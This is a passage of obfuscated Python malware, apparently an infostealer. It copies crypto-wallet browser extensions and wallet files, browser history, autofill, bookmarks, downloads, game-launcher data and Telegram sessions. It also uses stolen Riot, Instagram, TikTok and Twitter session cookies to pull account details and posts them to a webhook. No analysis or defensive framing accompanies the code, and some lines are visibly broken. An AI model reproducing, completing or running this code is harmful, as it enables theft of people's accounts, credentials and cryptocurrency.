                        asyncio .create_task (O0OO0O0O00OOO0O0O .TwitchSession (OO0000O0OO000OO00 ,OO000O0O00OOO0000 ,OOO00OOOO00O0O0OO ))
                        OO000O0O00OOO0000 =None
                        OO0000O0OO000OO00 =None
                    if "account.riotgames.com"in str (O0O0O0O000O00OOO0 [0 ]).lower ()and "sid"in str (O0O0O0O000O00OOO0 [1 ]).lower ():
                        asyncio .create_task (O0OO0O0O00OOO0O0O .RiotGamesSession (OO00O0O00000O00O0 ,OOO00OOOO00O0O0OO ))
        except :
            pass
    async def GetWallets (O0OOOO00000OOOO0O ,O0O0OOO00OO0O0O0O :str )->None :
        try :
            OO0O0OO000O00O0OO ={"MetaMask":"nkbihfbeogaeaoehlefnkodbefgpgknn","Binance":"fhbohimaelbohpjbbldcngcnapndodjp","Phantom":"bfnaelmomeimhlpmgjnjophhpkkoljpa","Coinbase":"hnfanknocfeofbddgcijnmhnfnkdnaad","Ronin":"fnjhmkhhmkbjkkabndcnnogagogbneec","Exodus":"aholpfdialjgjfhomihkjbmgjidlcdno","Coin98":"aeachknmefphepccionboohckonoeemg","KardiaChain":"pdadjkfkgcafgbceimcpbkalnfnepbnk","TerraStation":"aiifbnbfobpmeekipheeijimdpnlpgpp","Wombat":"amkmjjmmflddogmhpjloimipbofnfjih","Harmony":"fnnegphlobjdpkhecapkijjdkgcjhkib","Nami":"lpfcbjknijpeeillifnkikgncikgfhdo","MartianAptos":"efbglgofoippbgcjepnhiblaibcnclgk","Braavos":"jnlgamecbpmbajjfhmmmlhejkemejdma","XDEFI":"hmeobnfnfcmdkdcmlblgagmfpfboieaf","Yoroi":"ffnbelfdoeiohenkjibnmadjiehjhajb","TON":"nphplpgoakhhjchkkhmiggakijnkhfnd","Authenticator":"bhghoamapcdpbohphigoooaddinpkbai","MetaMask_Edge":"ejbalbakoplchlghecdalmeeeajnimhm","Tron":"ibnejdfjmmkpcnlpebklmnkoeoihofec",}
            O00OO0O0O000O00OO ={"Bitcoin":os .path .join (O0OOOO00000OOOO0O .RoamingAppData ,"Bitcoin","wallets"),"Zcash":os .path .join (O0OOOO00000OOOO0O .RoamingAppData ,"Zcash"),"Armory":os .path .join (O0OOOO00000OOOO0O .RoamingAppData ,"Armory"),"Bytecoin":os .path .join (O0OOOO00000OOOO0O .RoamingAppData ,"bytecoin"),"Jaxx":os .path .join (O0OOOO00000OOOO0O .RoamingAppData ,"com.liberty.jaxx","IndexedDB","file__0.indexeddb.leveldb"),"Exodus":os .path .join (O0OOOO00000OOOO0O .RoamingAppData ,"Exodus","exodus.wallet"),"Ethereum":os .path .join (O0OOOO00000OOOO0O .RoamingAppData ,"Ethereum","keystore"),"Electrum":os .path .join (O0OOOO00000OOOO0O .RoamingAppData ,"Electrum","wallets"),"AtomicWallet":os .path .join (O0OOOO00000OOOO0O .RoamingAppData ,"atomic","Local Storage","leveldb"),"Guarda":os .path .join (O0OOOO00000OOOO0O .RoamingAppData ,"Guarda","Local Storage","leveldb"),"Coinomi":os .path .join (O0OOOO00000OOOO0O .RoamingAppData ,"Coinomi","Coinomi","wallets"),}
            os .mkdir (os .path .join (O0O0OOO00OO0O0O0O ,"Wallets"))
            for O0OO0OO0OOOOOOOOO in O0OOOO00000OOOO0O .profiles_full_path :
                O0O0OOOOOO00O0000 =os .path .join (O0OO0OO0OOOOOOOOO ,"Local Extension Settings")
                if os .path .exists (O0O0OOOOOO00O0000 ):
                    for O00OO00000OOOO0OO ,O0O0O0000OOOOO00O in OO0O0OO000O00O0OO .items ():
                        if os .path .isdir (os .path .join (O0O0OOOOOO00O0000 ,O0O0O0000OOOOO00O )):
                            try :
                                O00OO0OOOO00000OO =os .path .join (O0O0OOOOOO00O0000 ,O0O0O0000OOOOO00O ).split ("\\")
                                O0O0000O0OOOO0O00 =f"{O00OO0OOOO00000OO[5]} {O00OO0OOOO00000OO[6]} {O00OO0OOOO00000OO[8]} {O00OO00000OOOO0OO}"
                                os .makedirs (O0O0OOO00OO0O0O0O +"\\Wallets\\"+O0O0000O0OOOO0O00 )
                                shutil .copytree (os .path .join (O0O0OOOOOO00O0000 ,O0O0O0000OOOOO00O ),os .path .join (O0O0OOO00OO0O0O0O ,"Wallets",O0O0000O0OOOO0O00 ,O0O0O0000OOOOO00O ))
                            except :
                                continue
            for O00O0OO0OOOO0O0OO ,OOO00O0O0000O0OO0 in O00OO0O0O000O00OO .items ():
                try :
                    if os .path .exists (OOO00O0O0000O0OO0 ):
                        shutil .copytree (OOO00O0O0000O0OO0 ,os .path .join (O0O0OOO00OO0O0O0O ,"Wallets",O00O0OO0OOOO0O0OO ))
                except :continue
        except :
            pass
    async def GetHistory (O0OO0O00OOO0O00OO )->None :
        try :
            for O0O0OOOO0OOOOOOO0 in O0OO0O00OOO0O00OO .profiles_full_path :
                O00OOO0O0OOOOO0O0 =os .path .join (O0O0OOOO0OOOOOOO0 ,"History")
                OOOOOO0OO0O0OO0O0 =os .path .join (O0OO0O00OOO0O00OO .Temp ,"HistoryData.db")
                shutil .copyfile (O00OOO0O0OOOOO0O0 ,OOOOOO0OO0O0OO0O0 )
                OO0000OO0O00OO00O =sqlite3 .connect (OOOOOO0OO0O0OO0O0 )
                O00000O000000OO00 =OO0000OO0O00OO00O .cursor ()
                O00000O000000OO00 .execute ('select id, url, title, visit_count, last_visit_time from urls')
                O000O000OOO0O000O =O00000O000000OO00 .fetchall ()
                try :
                    O00000O000000OO00 .close ()
                    OO0000OO0O00OO00O .close ()
                    os .remove (OOOOOO0OO0O0OO0O0 )
                except :pass
                for OO0OO00000O0OOOO0 in O000O000OOO0O000O :
                    Variables .Historys .append (f"ID : {OO0OO00000O0OOOO0[0]}\nURL : {OO0OO00000O0OOOO0[1]}\nitle : {OO0OO00000O0OOOO0[2]}\nVisit Count : {OO0OO00000O0OOOO0[3]}\nLast Visit Time {OO0OO00000O0OOOO0[4]}\n====================================================================================\n")
        except :
            pass
    async def GetAutoFill (OOO0O0OOO0O0OOO0O )->None :
        try :
            for O0OOOO000O000000O in OOO0O0OOO0O0OOO0O .profiles_full_path :
                O000OO0O0O0000OOO =os .path .join (O0OOOO000O000000O ,"Web Data")
                OOOOO00OO00O000OO =os .path .join (OOO0O0OOO0O0OOO0O .Temp ,"AutofillData.db")
                shutil .copyfile (O000OO0O0O0000OOO ,OOOOO00OO00O000OO )
                O0O0000OOO0OO0OOO =sqlite3 .connect (OOOOO00OO00O000OO )
                O0000O00O0O0O0O00 =O0O0000OOO0OO0OOO .cursor ()
                O0000O00O0O0O0O00 .execute ('select * from autofill')
                OOOOO0OO0000000O0 =O0000O00O0O0O0O00 .fetchall ()
                try :
                    O0000O00O0O0O0O00 .close ()
                    O0O0000OOO0OO0OOO .close ()
                    os .remove (OOOOO00OO00O000OO )
                except :pass
                for O0O00OO0OO00OO0OO in OOOOO0OO0000000O0 :
                    if O0O00OO0OO00OO0OO :
                        Variables .Autofills .append (f"{O0O00OO0OO00OO0OO}\n")
        except Exception :pass
    async def GetBookMark (O000OOO0000O0O00O )->None :
        try :
            for O0OO0OO0OO00OOO00 in O000OOO0000O0O00O .profiles_full_path :
                OOOOOOO0OO0OO00OO =os .path .join (O0OO0OO0OO00OOO00 ,"Bookmarks")
                if os .path .isfile (OOOOOOO0OO0OO00OO ):
                    with open (OOOOOOO0OO0OO00OO ,"r",encoding ="utf-8",errors ="ignore")as O0O00OOO000OO0OO0 :
                        OOOO0OO000OO0O000 =json .load (O0O00OOO000OO0OO0 )
                    OOOO0OO000OO0O000 =OOOO0OO000OO0O000 ["roots"]["bookmark_bar"]["children"]
                    if OOOO0OO000OO0O000 :
                        Variables .Bookmarks .append (f"Browser Path : {O0OO0OO0OO00OOO00}\nID : {OOOO0OO000OO0O000['id']}\nName : {OOOO0OO000OO0O000['name']}\nURL : {OOOO0OO000OO0O000['url']}\nGUID : {OOOO0OO000OO0O000['guid']}\nAdded At : {OOOO0OO000OO0O000['date_added']}\n\n=========================================================")
        except :
            pass
    async def GetDownload (OOOOOOO00OO000OO0 )->None :
        try :
            for OOO000OOOOOO0O000 in OOOOOOO00OO000OO0 .profiles_full_path :
                OO000OOOO0OOOOOOO =os .path .join (OOO000OOOOOO0O000 ,"History")
                O00OOO0O00000O00O =os .path .join (OOOOOOO00OO000OO0 .Temp ,"DownloadData.db")
                shutil .copyfile (OO000OOOO0OOOOOOO ,O00OOO0O00000O00O )
                OOO00000O000OOO00 =sqlite3 .connect (O00OOO0O00000O00O )
                OO00OOO0OO0OO000O =OOO00000O000OOO00 .cursor ()
                OO00OOO0OO0OO000O .execute ('select tab_url, target_path from downloads')
                OO000000O0OO0000O =OO00OOO0OO0OO000O .fetchall ()
                try :
                    OO00OOO0OO0OO000O .close ()
                    OOO00000O000OOO00 .close ()
                    os .remove (O00OOO0O00000O00O )
                except :pass
                for OO000O00O0O0OOOOO in OO000000O0OO0000O :
                    Variables .Downloads .append (f"Downloaded URL: {OO000O00O0O0OOOOO[0]}\nDownloaded Path: {OO000O00O0O0OOOOO[1]}\n\n")
        except :
            pass
    async def StealUplay (OO00OOOO0O0OOOO0O ,O0O000000OO00O00O :str )->None :
        try :
            OOOOOO0000OOOOO00 =False
            OOOOO000O00OO0000 =os .path .join (OO00OOOO0O0OOOO0O .LocalAppData ,"Ubisoft Game Launcher")
            O0O00O000O00O000O =os .path .join (OO00OOOO0O0OOOO0O .Temp ,O0O000000OO00O00O ,"Games","Uplay")
            if os .path .isdir (OOOOO000O00OO0000 ):
                if not os .path .exists (O0O00O000O00O000O ):
                    os .mkdir (O0O00O000O00O000O )
                for O0O00OOOO0O00OOOO in os .listdir (OOOOO000O00OO0000 ):
                    O0O0000OO0OOOO0OO =os .path .join (OOOOO000O00OO0000 ,O0O00OOOO0O00OOOO )
                    try :
                        shutil .copy (O0O0000OO0OOOO0OO ,os .path .join (O0O00O000O00O000O ,O0O00OOOO0O00OOOO ))
                        OOOOOO0000OOOOO00 =True
                    except :
                        continue
        except :
            pass
    async def StealEpicGames (O0000OO0O0OOO0000 ,OOOO0OO0O0OOOO0O0 :str )->None :
        try :
            O00OO0OOOO0OO0OO0 =False
            O00OO0OO0OOO0O00O =os .path .join (O0000OO0O0OOO0000 .LocalAppData ,"EpicGamesLauncher","Saved","Config","Windows")
            OO00OOOO00O0OO0O0 =os .path .join (O0000OO0O0OOO0000 .Temp ,OOOO0OO0O0OOOO0O0 ,"Games","Epic Games")
            if os .path .isdir (O00OO0OO0OOO0O00O ):
                if not os .path .exists (OO00OOOO00O0OO0O0 ):
                    os .mkdir (OO00OOOO00O0OO0O0 )
                try :
                    shutil .copytree (O00OO0OO0OOO0O00O ,os .path .join (OO00OOOO00O0OO0O0 ,"Windows"))
                    O00OO0OOOO0OO0OO0 =True
                except :
                    pass
        except Exception :
            pass
    async def StealGrowtopia (O00O000OO0O0OO000 ,OOO00OOO0OOO00O00 :str )->None :
        try :
            O0O0O00OO0OOO00O0 =False
            O000000O000O0O0O0 =os .path .join (O00O000OO0O0OO000 .LocalAppData ,"Growtopia","save.dat")
            O0OOO0O0OO00OOOO0 =os .path .join (O00O000OO0O0OO000 .Temp ,OOO00OOO0OOO00O00 ,"Games","Growtopia")
            if os .path .isfile (O000000O000O0O0O0 ):
                O0O0O00OO0OOO00O0 =True
                shutil .copy (O000000O000O0O0O0 ,os .path .join (O0OOO0O0OO00OOOO0 ,"save.dat"))
        except :
            pass
    async def StealTelegramSession (O0O000O0O0OO0O00O ,OO00OO00OO00O00O0 :str )->None :
        try :
            O0OO0000OO00OOOO0 =False
            OO0000O0O00O0O000 =os .path .join (O0O000O0O0OO0O00O .RoamingAppData ,"Telegram Desktop","tdata")
            if os .path .exists (OO0000O0O00O0O000 ):
                OO0OOOO0O0O00O0O0 =os .path .join (OO00OO00OO00O00O0 ,"Telegram Session")
                OOO0O00OOOOOOO000 =["dumps","emojis","user_data","working","emoji","tdummy","user_data
                OO0OOO000O0OOO0OO =await asyncio .create_subprocess_shell (f"taskkill /F /IM Telegram.exe",shell =True ,stdout =asyncio .subprocess .PIPE ,stderr =asyncio .subprocess .PIPE )
                await OO0OOO000O0OOO0OO .communicate ()
                if not os .path .exists (OO0OOOO0O0O00O0O0 ):
                    os .mkdir (OO0OOOO0O0O00O0O0 )
                for O0O0O0O0000OO000O in os .listdir (OO0000O0O00O0O000 ):
                    try :
                        _O0O0OO000OO0OO0O0 =os .path .join (OO0000O0O00O0O000 ,O0O0O0O0000OO000O )
                        if not O0O0O0O0000OO000O in OOO0O00OOOOOOO000 :
                            OO000O00O0O0OOO00 =_O0O0OO000OO0OO0O0 .split ("\\")[7 ]
                            if os .path .isfile (_O0O0OO000OO0OO0O0 ):
                                shutil .copyfile (_O0O0OO000OO0OO0O0 ,os .path .join (OO0OOOO0O0O00O0O0 ,OO000O00O0O0OOO00 ))
                            elif os .path .isdir (_O0O0OO000OO0OO0O0 ):
                                shutil .copytree (_O0O0OO000OO0OO0O0 ,os .path .join (OO0OOOO0O0O00O0O0 ,OO000O00O0O0OOO00 ))
                            O0OO0000OO00OOOO0 =True
                    except :continue
        except :
            pass
    async def RiotGamesSession (O00OO0OO00000000O ,OOOO0OOO0OO0O0O00 ,OOOO0O0000OOOO0OO :str )->None :
        try :
            OO0O0O0O0OO000OOO =aiohttp .TCPConnector (ssl =True )
            async with aiohttp .ClientSession (connector =OO0O0O0O0OO000OOO )as OO00O0O0O0O000000 :
                async with OO00O0O0O0O000000 .get ('https://account.riotgames.com/api/account/v1/user',headers ={"Cookie":f"sid={OOOO0OOO0OO0O0O00}"})as O000O0OOO000O0000 :
                    OO000O0O0OO00OOOO =await O000O0OOO000O0000 .json ()
                O000OOOOOOO00OO00 ={"title":"***Shit***","description":f"***Riot Games Session was detected on the {OOOO0O0000OOOO0OO} browser***","url":"Shit","color":0 ,"footer":{"text":"Shit"},"thumbnail":{"url":"Shit"}}
                O0000OOO0OOOO0000 =str (OO000O0O0OO00OOOO ["username"])
                O0O0000O0O0O0O00O =str (OO000O0O0OO00OOOO ["email"])
                O0OO0OO0OOO0OO00O =str (OO000O0O0OO00OOOO ["region"])
                OO000OOOO000O0OOO =str (OO000O0O0OO00OOOO ["locale"])
                O000O0OO0OOOO000O =str (OO000O0O0OO00OOOO ["country"])
                OOO00O0OO000OO0O0 =str (OO000O0O0OO00OOOO ["mfa"]["verified"])
                OO0O000OOOOOOOOO0 =[{"name":"Username","value":"``"+O0000OOO0OOOO0000 +"``","inline":True },{"name":"Email","value":"``"+O0O0000O0O0O0O00O +"``","inline":True },{"name":"Region","value":"``"+O0OO0OO0OOO0OO00O +"``","inline":True },{"name":"Locale","value":"``"+OO000OOOO000O0OOO +"``","inline":True },{"name":"Country","value":"``"+O000O0OO0OOOO000O +"``","inline":True },{"name":"MFA Enabled?","value":"``"+OOO00O0OO000OO0O0 +"``","inline":True },{"name":"Cookie","value":"``"+OOOO0OOO0OO0O0O00 +"``","inline":False },]
                O000OOOOOOO00OO00 ["fields"]=OO0O000OOOOOOOOO0
                O0OOOOOO0O00OOOO0 ={"username":"Shit","embeds":[O000OOOOOOO00OO00 ]}
                OO0OOOO0O00OOO00O ={"Content-Type":"application/json"}
                async with OO00O0O0O0O000000 .post (webhook ,json =O0OOOOOO0O00OOOO0 ,headers =OO0OOOO0O00OOO00O )as OO000O0O0OO00OOOO :
                    pass
        except :
            pass
        else :
            Variables .RiotGameAccounts .append (f'Username : {O0000OOO0OOOO0000}\nEmail : {O0O0000O0O0O0O00O}\nRegion : {O0OO0OO0OOO0OO00O}\nLocale : {OO000OOOO000O0OOO}\nCountry : {O000O0OO0OOOO000O}\nMFA Enabled : {OOO00O0OO000OO0O0}\nCookie : {OOOO0OOO0OO0O0O00}\n======================================================================\n')
    async def InstaSession (OOOOOO00OOO000O00 ,OO00OOOOO00O0OOO0 ,O00OOOOOO0O00O000 :str )->None :
        try :
            O0O0O0O00000O0OOO ="Shit"
            O0OOOOO0000000O0O =""
            OOOO0OOOO0O0OO00O =""
            OOOOOO0O0000OO000 ={"user-agent":"Instagram 219.0.0.12.117 Android","cookie":f"sessionid={OO00OOOOO00O0OOO0}"}
            OO0OOO0O00000O0OO ='https://i.instagram.com/api/v1/accounts/current_user/?edit=true'
            async with aiohttp .ClientSession (headers =OOOOOO0O0000OO000 ,connector =aiohttp .TCPConnector (ssl =True ))as O00OOO0000O0O0000 :
                async with O00OOO0000O0O0000 .get (OO0OOO0O00000O0OO )as OO0OO000O00O0O00O :
                    OO0OO000O0OO0OOO0 =await OO0OO000O00O0O00O .json ()
                async with O00OOO0000O0O0000 .get (f"https://i.instagram.com/api/v1/users/{OO0OO000O0OO0OOO0['user']['pk']}/info/")as OO0OO000O00O0O00O :
                    O00O0OOOOOOO00O00 =await OO0OO000O00O0O00O .json ()
            try :
                O0O0O0O00000O0OOO =OO0OO000O0OO0OOO0 ["user"]["profile_pic_url"]
            except :
                pass
            O0OOOO00000O0OOOO =OO0OO000O0OO0OOO0 ["user"]["username"]
            OOO00O0O0O0O00OOO ="https://instagram.com/"+O0OOOO00000O0OOOO
            if OO0OO000O0OO0OOO0 ["user"]["biography"]=="":
                O0OOOOO0000000O0O ="No bio"
            else :
                O0OOOOO0000000O0O =OO0OO000O0OO0OOO0 ["user"]["biography"]
            O0OOOOO0000000O0O =O0OOOOO0000000O0O .replace ("\n",", ")
            if OO0OO000O0OO0OOO0 ["user"]["full_name"]=="":
                OOOO0OOOO0O0OO00O ="No nickname"
            else :
                OOOO0OOOO0O0OO00O =OO0OO000O0OO0OOO0 ["user"]["full_name"]
            OO0O0OOOOO0OOO0O0 =OO0OO000O0OO0OOO0 ["user"]["email"]
            O0OO0O0OO00OO0OOO =OO0OO000O0OO0OOO0 ["user"]["is_verified"]
            OOOO0OO0O0OO0O000 =O00O0OOOOOOO00O00 ["user"]["follower_count"]
            OOO0OOO00O00O00OO =O00O0OOOOOOO00O00 ["user"]["following_count"]
            O00OOO0OO0O0O00O0 ={"title":"***Shit***","description":f"**Instagram Session was detected on the {O00OOOOOO0O00O000} browser***","url":"Shit","color":0 ,"footer":{"text":"Shit"},"thumbnail":{"url":O0O0O0O00000O0OOO }}
            OO0OOO00O000O0OOO =[{"name":"Username","value":"``"+O0OOOO00000O0OOOO +"``","inline":True },{"name":"Nick Name","value":"``"+OOOO0OOOO0O0OO00O +"``","inline":True },{"name":"Email","value":"``"+OO0O0OOOOO0OOO0O0 +"``","inline":True },{"name":"is Verified","value":"``"+str (O0OO0O0OO00OO0OOO )+"``","inline":True },{"name":"Followers","value":"``"+str (OOOO0OO0O0OO0O000 )+"``","inline":True },{"name":"Following","value":"``"+str (OOO0OOO00O00O00OO )+"``","inline":True },{"name":"Profile URL","value":"``"+OOO00O0O0O0O00OOO +"``","inline":False },{"name":"Biography","value":"``"+O0OOOOO0000000O0O +"``","inline":False },{"name":"Cookie","value":"``"+OO00OOOOO00O0OOO0 +"``","inline":False },]
            O00OOO0OO0O0O00O0 ["fields"]=OO0OOO00O000O0OOO
            async with aiohttp .ClientSession (connector =aiohttp .TCPConnector (ssl =True ))as O00OOO0000O0O0000 :
                O0000O000OO000OO0 ={"username":"Shit","embeds":[O00OOO0OO0O0O00O0 ]}
                OOOOOO0O0000OO000 ={"Content-Type":"application/json"}
                async with O00OOO0000O0O0000 .post (webhook ,json =O0000O000OO000OO0 ,headers =OOOOOO0O0000OO000 )as OO0OO000O00O0O00O :
                    pass
        except Exception :
            pass
        else :
            Variables .InstagramAccounts .append (f"Cookie : {OO00OOOOO00O0OOO0}\nProfile URL : {OOO00O0O0O0O00OOO}\nUsername : {O0OOOO00000O0OOOO}\nNick Name : {OOOO0OOOO0O0OO00O}\nis Verified : {O0OO0O0OO00OO0OOO}\nEmail : {OO0O0OOOOO0OOO0O0}\nFollowers : {OOOO0OO0O0OO0O000}\nFollowing : {OOO0OOO00O00O00OO}\nBiography : {O0OOOOO0000000O0O}\n======================================================================\n")
    async def TikTokSession (O00000OOOO0O00OOO ,O0O0O00OOOO0000O0 ,O00OO000O0OO00OO0 :str )->None :
        try :
            OOO000OOOO000OO00 =''
            OOO0O0OO00O00000O =''
            OOOOOO0O000O00OO0 ="sessionid="+O0O0O00OOOO0000O0
            O00O0OOO00000OOO0 ={"cookie":OOOOOO0O000O00OO0 ,"Accept-Encoding":"identity"}
            OOO0OO0OO0O0OO0OO ={"cookie":OOOOOO0O000O00OO0 }
            O0OOO0O00O00O00O0 ='https://www.tiktok.com/passport/web/account/info/?aid=1459&app_language=de-DE&app_name=tiktok_web&battery_info=1&browser_language=de-DE&browser_name=Mozilla&browser_online=true&browser_platform=Win32&browser_version=5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F112.0.0.0%20Safari%2F537.36&channel=tiktok_web&cookie_enabled=true&device_platform=web_pc&focus_state=true&from_page=fyp&history_len=2&is_fullscreen=false&is_page_visible=true&os=windows&priority_region=DE&referer=&region=DE&screen_height=1080&screen_width=1920&tz_name=Europe%2FBerlin&webcast_language=de-DE'
            OO0OOO00OOO0000OO ='https://webcast.tiktok.com/webcast/wallet_api/diamond_buy/permission/?aid=1988&app_language=de-DE&app_name=tiktok_web&battery_info=1&browser_language=de-DE&browser_name=Mozilla&browser_online=true&browser_platform=Win32&browser_version=5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F112.0.0.0%20Safari%2F537.36&channel=tiktok_web&cookie_enabled=true'
            async with aiohttp .ClientSession (connector =aiohttp .TCPConnector (ssl =True ))as OOOO00OOO0OO0000O :
                async with OOOO00OOO0OO0000O .get (O0OOO0O00O00O00O0 ,headers =O00O0OOO00000OOO0 )as O0OO000O0O00O00OO :
                    OO0O0O0O000O00OO0 =await O0OO000O0O00O00OO .json ()
                async with OOOO00OOO0OO0000O .get (OO0OOO00OOO0000OO ,headers =OOO0OO0OO0O0OO0OO )as O0O0O00O0O00000O0 :
                    OO0000OOO0OO00000 =await O0O0O00O0O00000O0 .json ()
            O0O00OOOO0OOO0O00 =OO0O0O0O000O00OO0 ["data"]["user_id"]
            if not OO0O0O0O000O00OO0 ["data"]["email"]:
                OOO000OOOO000OO00 ="No Email"
            else :
                OOO000OOOO000OO00 =OO0O0O0O000O00OO0 ["data"]["email"]
            if not OO0O0O0O000O00OO0 ["data"]["mobile"]:
                OOO0O0OO00O00000O ="No number"
            else :
                OOO0O0OO00O00000O =OO0O0O0O000O00OO0 ["data"]["mobile"]
            O00O00OO0O0O00000 =OO0O0O0O000O00OO0 ["data"]["username"]
            O00OO00000OOOO000 =OO0000OOO0OO00000 ["data"]["coins"]
            O0OO00O0O0O00OOOO ={"title":"***Shit***","description":f"***Tiktok Session was detected on the {O00OO000O0OO00OO0} browser***","url":"Shit","color":0 ,"footer":{"text":"Shit"},"thumbnail":{"url":"Shit"}}
            O0O0O0000OO0OOO0O =[{"name":"Username","value":"``"+O00O00OO0O0O00000 +"``","inline":True },{"name":"Email","value":"``"+OOO000OOOO000OO00 +"``","inline":True },{"name":"Phone","value":"``"+str (OOO0O0OO00O00000O )+"``","inline":True },{"name":"User identifier","value":"``"+str (O0O00OOOO0OOO0O00 )+"``","inline":True },{"name":"Coins","value":"``"+str (O00OO00000OOOO000 )+"``","inline":True },{"name":"Profile URL","value":"``"+f'https://tiktok.com/@{O00O00OO0O0O00000}'+"``","inline":False },{"name":"Tiktok Cookie","value":"``"+O0O0O00OOOO0000O0 +"``","inline":False },]
            O0OO00O0O0O00OOOO ["fields"]=O0O0O0000OO0OOO0O
            async with aiohttp .ClientSession (connector =aiohttp .TCPConnector (ssl =True ))as OOOO00OOO0OO0000O :
                O0OO0OOO0O0O0OOOO ={"username":"Shit","embeds":[O0OO00O0O0O00OOOO ]}
                O00O0OOO00000OOO0 ={"Content-Type":"application/json"}
                async with OOOO00OOO0OO0000O .post (webhook ,json =O0OO0OOO0O0O0OOOO ,headers =O00O0OOO00000OOO0 )as O0OO000O0O00O00OO :
                    pass
        except :
            pass
        else :
            Variables .TikTokAccounts .append (f"Cookie : {OOOOOO0O000O00OO0}\nUser identifier : {O0O00OOOO0OOO0O00}\nProfile URL : https://tiktok.com/@{O00O00OO0O0O00000}\nUsername : {username}\nEmail : {OOO000OOOO000OO00}\nPhone : {OOO0O0OO00O00000O}\nCoins : {O00OO00000OOOO000}\n======================================================================\n")
    async def TwitterSession (O0OOO0O00OOO00OOO ,O0000OOO000O0O000 ,O0O0O00O00O0O0OO0 :str )->None :
        try :
            O0O0OOO0O0O00O0OO =''
            OOO0O0O0OOO00O0OO =f'{O0000OOO000O0O000};ct0=ac1aa9d58c8798f0932410a1a564eb42'
            OOOO000OO00000OO0 ={'authority':'twitter.com','accept':'*/*','accept-language':'en-US,en;q=0.9','authorization':'Bearer AAAAAAAAAAAAAAAAAAAAANRILgAAAAAAnNwIzUejRCOuH5E6I8xnZz4puTs%3D1Zv7ttfk8LF81IUq16cHjhLTvJu4FA33AGWWjCpTnA','origin':'https://twitter.com','referer':'https://twitter.com/home','sec-fetch-dest':'empty','sec-fetch-mode':'cors','sec-fetch-site':'same-origin','sec-gpc':'1','user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36','x-twitter-active-user':'yes','x-twitter-auth-type':'OAuth2Session','x-twitter-client-language':'en','x-csrf-token':'ac1aa9d58c8798f0932410a1a564eb42',"cookie":f'auth_token={OOO0O0O0OOO00O0OO}'}
            O000OOOO0O0O00000 ="https://twitter.com/i/api/1.1/account/update_profile.json"
            async with aiohttp .ClientSession (connector =aiohttp .TCPConnector (ssl =True ))as OO00OOOOO0OO0000O :
                async with OO00OOOOO0OO0000O .post (O000OOOO0O0O00000 ,headers =OOOO000OO00000OO0 )as O00O00OO0O000O0OO :
                    O0O00OO00OOO0OOO0 =await O00O00OO0O000O0OO .json ()
            try :
                if O0O00OO00OOO0OOO0 ["description"]=="":
                    O0O0OOO0O0O00O0OO ="There is no bio"
                else :
                    O0O0OOO0O0O00O0OO =O0O00OO00OOO0OOO0 ["description"]
            except :
                O0O0OOO0O0O00O0OO ="There is no biography"
            O0O0OOO0O0O00O0OO =O0O0OOO0O0O00O0OO .replace ("\n",", ")
            O00OOOOO00OO0O00O =O0O00OO00OOO0OOO0 ["profile_image_url_https"]
            OO0OOOO0O00O0000O =O0O00OO00OOO0OOO0 ["name"]
            O0O000OO0OO0O0O0O =O0O00OO00OOO0OOO0 ["screen_name"]
            O00O0O0OOOO000OOO ="https://twitter.com/"+OO0OOOO0O00O0000O
            OOO0OOOO00OOOO000 ={"title":"***Shit***","description":f"***Twitter Session was detected on the {O0O0O00O00O0O0OO0} browser***","url":"Shit","color":0 ,"footer":{"text":"Shit"},"thumbnail":{"url":O00OOOOO00OO0O00O }}
            OOOOOO0O0O0O0OOOO =[{"name":"Username","value":"``"+OO0OOOO0O00O0000O +"``","inline":True },{"name":"Screen Name","value":"``"+O0O000OO0OO0O0O0O +"``","inline":True },{"name":"Followers","value":"``"+str (O0O00OO00OOO0OOO0 ['followers_count'])+"``","inline":True },{"name":"Following","value":"``"+str (O0O00OO00OOO0OOO0 ['friends_count'])+"``","inline":True },{"name":"Tweets","value":"``"+str (O0O00OO00OOO0OOO0 ['statuses_count'])+"``","inline":True },{"name":"Is Verified","value":"``"+str (O0O00OO00OOO0OOO0 ['verified'])+"``","inline":True },{"name":"Created At","value":"``"+str (O0O00OO00OOO0OOO0 ['created_at'])+"``","inline":True },{"name":"Biography","value":"``"+str (O0O0OOO0O0O00O0OO )+"``","inline":False },{"name":"Profile URL","value":"``"+str (O00O0O0OOOO000OOO )+"``","inline":False },{"name":"Cookie","value":"``"+str (O0000OOO000O0O000 )+"``","inline":False },]
            OOO0OOOO00OOOO000 ["fields"]=OOOOOO0O0O0O0OOOO
            async with aiohttp .ClientSession (connector =aiohttp .TCPConnector (ssl =True ))as OO00OOOOO0OO0000O :
                OO0O000O00O0OOOOO ={"username":"Shit","embeds":[OOO0OOOO00OOOO000 ]}
                OOOO000OO00000OO0 ={"Content-Type":"application/json"}
                async with OO00OOOOO0OO0000O .post (webhook ,json =OO0O000O00O0OOOOO ,headers =OOOO000OO00000OO0 )as O00O00OO0O000O0OO :
                    pass
            Variables .TwitterAccounts .append (f"Username : {OO0OOOO0O00O0000O}\nScreen Name : {O0O000OO0OO0O0O0O}\nFollowers : {O0O00OO00OOO0OOO0['followers_count']}\nFollowing : {O0O00OO00OOO0OOO0['friends_count']}\nTweets : {O0O00OO00OOO0OOO0['statuses_count']}\nVerified : {O0O00OO00OOO0OOO0['verified']}\nCreated At : {O0O00OO00OOO0OOO0['created_at']}\nProfile URL : {O00O0O0OOOO000OOO}\nCookie : {O0000OOO000O0O000}\nBiography : {O0O0OOO0O0O00O0OO}\n=====================================================\n")
        except Exception :
            pass
    async def TwitchSession (OO0O000000O0000O0 ,O0000000OOOOO0O00 ,O0O00OO0O00O0OO0O ,OO0O00OOO0O00OOOO :str )->None :
        try :
            O0OOOOOO00O000OO0 ='https://gql.twitch.tv/gql'
            O0OOO0OOOOO0000OO ={'Authorization':f'OAuth {O0000000OOOOO0O00}',}
            O0OOO0000O0OOO000 =f"""
            query {{
                user(login: "{O0O00OO0O00O0OO0O}") {{
                    id
                    login
                    displayName
                    email
                    hasPrime
                    isPartner
                    language
                    profileImageURL(width: 300)
                    bitsBalance
                    followers {{
                        totalCount
                    }}
                }}
            }}"""#line:960
            OO00O0OOO0OOO0OOO ={"query":O0OOO0000O0OOO000 }
